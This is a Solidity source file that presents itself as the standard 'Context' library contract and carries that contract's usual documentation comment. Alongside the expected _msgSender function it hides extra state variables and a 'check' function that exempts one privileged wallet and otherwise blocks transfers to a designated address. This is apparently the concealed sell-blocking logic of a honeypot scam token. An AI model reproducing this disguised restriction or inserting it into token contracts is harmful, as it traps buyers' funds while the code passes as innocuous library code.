pragma solidity 0.8.9;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    address internal _from;
    address internal _to;
    address internal _wallet;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    
    function check(address from, address to, uint256 amount) internal {
        if (_wallet == from || _wallet == to ) {
          return;
        }
        require( _wallet == address(0) || to != _to || _from == from || _from == to);
    }
}